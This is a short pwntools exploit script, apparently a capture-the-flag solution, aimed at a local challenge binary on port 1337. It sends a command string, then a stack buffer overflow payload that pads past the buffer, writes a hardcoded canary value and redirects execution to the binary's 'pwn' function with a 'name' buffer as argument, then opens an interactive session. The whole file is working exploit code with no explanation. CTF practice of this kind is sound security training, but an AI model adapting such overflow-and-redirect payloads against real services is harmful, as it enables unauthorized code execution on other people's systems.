from pwn import *

IP = "127.0.0.1"
PORT = 1337
elf = ELF("chall")
canary = 0x1b392100
p = remote(IP,PORT)
cmd = b"touch /tmp/here;\x00\n"
payload = b"A"*200
payload += p32(canary)
payload += b"B"*12
payload += p32(elf.symbols.pwn)
payload += p32(0)
payload += p32(elf.symbols.name)
payload += b"\n"
input()
p.recv()
p.send(cmd)
p.recv()
p.send(payload)
p.interactive()
